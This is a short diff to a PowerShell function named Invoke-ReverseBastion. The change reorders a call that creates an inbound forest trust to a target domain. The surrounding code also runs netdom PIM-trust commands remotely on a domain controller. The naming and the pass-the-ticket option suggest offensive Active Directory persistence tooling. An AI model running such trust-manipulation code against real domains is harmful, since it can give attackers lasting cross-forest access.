@@ -73,13 +73,6 @@ function Invoke-ReverseBastion {
         $Credential.Password
     }
 
-    [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateTrustRelationship(
-        $TargetDomain,
-        $trustpass,
-        [System.DirectoryServices.ActiveDirectory.TrustDirection]::Inbound,
-        [System.DirectoryServices.ActiveDirectory.TrustType]::Forest
-    )
-
     $block = {
         param(
             [string]$CurrentDomain,
@@ -111,6 +104,13 @@ function Invoke-ReverseBastion {
         netdom trust $CurrentDomain /EnablePIMTrust:yes
         netdom trust $CurrentDomain /Verify
     }
+
+    [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateTrustRelationship(
+        $TargetDomain,
+        $trustpass,
+        [System.DirectoryServices.ActiveDirectory.TrustDirection]::Inbound,
+        [System.DirectoryServices.ActiveDirectory.TrustType]::Forest
+    )
 
     if ($PTT) {
         Invoke-Command -ComputerName $TargetDC -ScriptBlock $block -ArgumentList "-CurrentDomain $CurrentDomain -TargetDomain $TargetDomain -trustpass $trustpass"
